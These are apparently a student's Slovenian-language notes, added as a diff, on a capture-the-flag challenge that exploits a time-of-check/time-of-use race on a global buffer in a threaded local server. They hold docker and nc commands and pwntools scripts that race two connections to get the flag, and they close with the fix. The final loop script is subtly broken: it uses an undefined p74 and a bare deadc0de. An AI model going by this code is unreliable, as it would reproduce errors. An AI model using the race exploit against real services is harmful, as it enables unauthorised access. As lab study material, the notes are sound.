@@ -1,0 +1,93 @@
+time_0
+time_1
+
+Sidechannel - čas
+TOU - TOC time of use time of check
+
+time_0:
+
+prebere ime datoteke
+
+time 1
+
+
+mutex- lock sam jst loh laufam to in noben drug, dokler ne odklenem (sam en thread izvaja to kodo)
+
+recv -> prebere 8 bytov (vse) in pol vrne
+
+send_back vrne flag 
+
+docker build -t test .
+
+docker run -d --rm -p 1337:1337 test
+
+nc localhost 1337 -> loh pogovarjas s serverjem
+
+ce probas 1337c0de poslat ne bo delal ( buffer je long (8 B))
+
+from pwn import *
+p = remote('localhost', 1337)
+p.sendline(b"\xde\xc0\x37\x13\x00\x00\x00\x00")
+p.sendline(p64(0xdeadc0de))
+p.interactive()
+stack, heap, bss (statični stringi, globalne spremenljivke)
+kaj je sheran med threadi?
+
+stack ni, ker so funkcije (lokalne spremenljivke …) in trace notr shranjeni, tezko je to shared med njimi
+heap da, ker so dinamični podatki
+bss da, ker so globalne spremenlivke duh
+
+kje se nahaja naš bufffer?
+v bss (ker je globalna spremenljivka), to pomen da je med vsemi threadi viden. to pomen da server omogoča da si threadi sherajo podatke in pišejo na isto spremenljivko -> čeprov je lockan thread loh sezmer zapisujemo na njega iz vecih threadov. kot napadalci loh zalaufamo še en connection
+
+
+p1 = remote('localhost', 1337)
+p2 = remote('localhost', 1337)
+
+p1.sendline(p64(0x1337c0de))
+p2.sendline(p64(0xdeadc0de))
+
+p1. intereactive()
+
+zdj mas dva posebi threda, in v prvem posljes leetcode v drugem pa deadcode. torej loh z dvema connectiona (2 threadoma) in upamo da pride leetcode čez taprvi if uspesno prisel, deadcode bo pa pr ifu padu
+
+naša koda: 1. if(1337) 
+		2. if(dead) 
+			3. flag
+
+
+tabelica
+
+t1                         t1                  buf
+->1337                                        1337
+1. passa(ker je 1337 notr)                     1337
+			   dead               dead
+			   1. X                dead
+2. passa (dead notr v buff)
+3. izvedemo
+
+
+torej mi upamo, da bomo mel tako sekvenco dogodkov.
+
+če dostkrat probamo se bo naša koda uspešno izvedla v tej sekvenci
+
+vidmo da se nam ne izida prav dobro če ročno to delamo
+en while naredmo
+
+p1 = remote('localhost', 1337)
+p2 = remote('localhost', 1337)
+while True:
+	p1.sendline(p64(0x1337c0de))
+	p2.sendline(p74(deadc0de))
+	p1.recvline() # You are in!
+	flag = p1.recvline() #maybe flag, maybe nope!
+	p2.recvline() # Nope!
+	if b'flag' in flag:
+		print(flag)
+		break
+
+p1.close()
+p2.close()
+
+kako popravit -> buffer ne bi bil globalen
+
